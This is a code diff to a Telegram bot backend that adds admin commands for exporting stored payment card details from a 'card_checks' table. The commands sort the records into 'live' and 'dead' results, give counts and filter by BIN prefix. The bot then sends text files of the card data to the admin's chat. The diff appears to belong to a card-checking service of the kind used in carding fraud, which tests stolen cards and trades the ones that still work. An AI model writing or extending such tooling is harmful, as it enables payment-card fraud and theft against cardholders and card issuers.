@@ -218,6 +218,47 @@ async function editMessageReplyMarkup(
   }
 }
 
+// Send document (file) via Telegram
+async function sendTelegramDocument(
+  chatId: string | number,
+  fileContent: string,
+  filename: string,
+  caption?: string
+): Promise<boolean> {
+  if (!TELEGRAM_BOT_TOKEN) return false;
+
+  try {
+    const formData = new FormData();
+    formData.append("chat_id", chatId.toString());
+    
+    // Create a blob from the file content
+    const blob = new Blob([fileContent], { type: "text/plain" });
+    formData.append("document", blob, filename);
+    
+    if (caption) {
+      formData.append("caption", caption);
+      formData.append("parse_mode", "HTML");
+    }
+
+    const response = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+      {
+        method: "POST",
+        body: formData,
+      }
+    );
+
+    if (!response.ok) {
+      console.error("Telegram sendDocument error:", await response.json());
+      return false;
+    }
+    return true;
+  } catch (error) {
+    console.error("Error sending Telegram document:", error);
+    return false;
+  }
+}
+
 // ═══════════════════════════════════════════════════════════
 // BOT COMMANDS REGISTRATION
 // ═══════════════════════════════════════════════════════════
@@ -256,6 +297,10 @@ async function setBotCommands(): Promise<void> {
     { command: "promote", description: "Promote to moderator" },
     { command: "demote", description: "Demote moderator" },
     { command: "admins", description: "List admins & mods" },
+    { command: "allcards", description: "Export all checked cards" },
+    { command: "livecards", description: "Export live cards only" },
+    { command: "deadcards", description: "Export dead cards only" },
+    { command: "bincard", description: "Export cards by BIN" },
   ];
 
   try {
@@ -3139,6 +3184,183 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
     // /viewbans
     if (text === "/viewbans") {
       await handleViewBans(chatId, supabase);
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
+    // ─────────────────────────────────────────────────────────
+    // CARD EXPORT COMMANDS (Admin Only)
+    // ─────────────────────────────────────────────────────────
+
+    // /allcards - Export all checked cards
+    if (text === "/allcards") {
+      const isAdmin = await isAdminAsync(chatId, supabase);
+      if (!isAdmin) {
+        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      await sendTelegramMessage(chatId, "⏳ <b>Fetching all cards...</b>\n\nPlease wait while I prepare the file.");
+
+      const { data: cards, error } = await supabase
+        .from("card_checks")
+        .select("card_details, result, gateway, created_at")
+        .order("created_at", { ascending: false });
+
+      if (error || !cards || cards.length === 0) {
+        await sendTelegramMessage(chatId, "❌ <b>No cards found</b>\n\nThe database has no card check records.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      const liveCount = cards.filter((c: any) => c.result === "live").length;
+      const deadCount = cards.filter((c: any) => c.result === "dead").length;
+      const unknownCount = cards.filter((c: any) => c.result !== "live" && c.result !== "dead").length;
+
+      const fileContent = cards.map((c: any) => c.card_details || "Unknown").join("\n");
+      const filename = `all_cards_${new Date().toISOString().split("T")[0]}.txt`;
+
+      await sendTelegramDocument(
+        chatId,
+        fileContent,
+        filename,
+        `📁 <b>All Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards`
+      );
+
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
+    // /livecards - Export live cards only
+    if (text === "/livecards") {
+      const isAdmin = await isAdminAsync(chatId, supabase);
+      if (!isAdmin) {
+        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      await sendTelegramMessage(chatId, "⏳ <b>Fetching live cards...</b>\n\nPlease wait while I prepare the file.");
+
+      const { data: cards, error } = await supabase
+        .from("card_checks")
+        .select("card_details, gateway, created_at")
+        .eq("result", "live")
+        .order("created_at", { ascending: false });
+
+      if (error || !cards || cards.length === 0) {
+        await sendTelegramMessage(chatId, "❌ <b>No live cards found</b>\n\nThere are no live card records in the database.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      const fileContent = cards.map((c: any) => c.card_details || "Unknown").join("\n");
+      const filename = `live_cards_${new Date().toISOString().split("T")[0]}.txt`;
+
+      await sendTelegramDocument(
+        chatId,
+        fileContent,
+        filename,
+        `📁 <b>Live Cards Export</b>\n\n✅ Total Live Cards: ${cards.length}`
+      );
+
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
+    // /deadcards - Export dead cards only
+    if (text === "/deadcards") {
+      const isAdmin = await isAdminAsync(chatId, supabase);
+      if (!isAdmin) {
+        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      await sendTelegramMessage(chatId, "⏳ <b>Fetching dead cards...</b>\n\nPlease wait while I prepare the file.");
+
+      const { data: cards, error } = await supabase
+        .from("card_checks")
+        .select("card_details, gateway, created_at")
+        .eq("result", "dead")
+        .order("created_at", { ascending: false });
+
+      if (error || !cards || cards.length === 0) {
+        await sendTelegramMessage(chatId, "❌ <b>No dead cards found</b>\n\nThere are no dead card records in the database.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      const fileContent = cards.map((c: any) => c.card_details || "Unknown").join("\n");
+      const filename = `dead_cards_${new Date().toISOString().split("T")[0]}.txt`;
+
+      await sendTelegramDocument(
+        chatId,
+        fileContent,
+        filename,
+        `📁 <b>Dead Cards Export</b>\n\n❌ Total Dead Cards: ${cards.length}`
+      );
+
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
+    // /bincard <bin> - Export cards by BIN (first 6 digits)
+    if (text.startsWith("/bincard")) {
+      const isAdmin = await isAdminAsync(chatId, supabase);
+      if (!isAdmin) {
+        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      const bin = text.replace("/bincard", "").trim();
+      
+      if (!bin || bin.length < 4 || bin.length > 8 || !/^\d+$/.test(bin)) {
+        await sendTelegramMessage(chatId, `
+❌ <b>Invalid BIN Format</b>
+
+<b>Usage:</b> /bincard <code>[BIN]</code>
+
+<b>Examples:</b>
+• /bincard 424242
+• /bincard 5555
+• /bincard 37828224
+
+<i>BIN should be 4-8 digits (first digits of card number)</i>
+`);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      await sendTelegramMessage(chatId, `⏳ <b>Fetching cards with BIN ${bin}...</b>\n\nPlease wait while I search the database.`);
+
+      // Fetch all cards and filter by BIN prefix
+      const { data: allCards, error } = await supabase
+        .from("card_checks")
+        .select("card_details, result, gateway, created_at")
+        .order("created_at", { ascending: false });
+
+      if (error) {
+        await sendTelegramMessage(chatId, "❌ <b>Database Error</b>\n\nFailed to fetch cards.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Filter cards that start with the given BIN
+      const matchingCards = (allCards || []).filter((c: any) => {
+        const cardDetails = c.card_details || "";
+        const cardNumber = cardDetails.split("|")[0] || cardDetails;
+        return cardNumber.startsWith(bin);
+      });
+
+      if (matchingCards.length === 0) {
+        await sendTelegramMessage(chatId, `❌ <b>No cards found</b>\n\nNo cards found with BIN: <code>${bin}</code>`);
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      const liveCount = matchingCards.filter((c: any) => c.result === "live").length;
+      const deadCount = matchingCards.filter((c: any) => c.result === "dead").length;
+      const unknownCount = matchingCards.filter((c: any) => c.result !== "live" && c.result !== "dead").length;
+
+      const fileContent = matchingCards.map((c: any) => c.card_details || "Unknown").join("\n");
+      const filename = `bin_${bin}_cards_${new Date().toISOString().split("T")[0]}.txt`;
+
+      await sendTelegramDocument(
+        chatId,
+        fileContent,
+        filename,
+        `📁 <b>BIN ${bin} Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${matchingCards.length} cards`
+      );
+
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
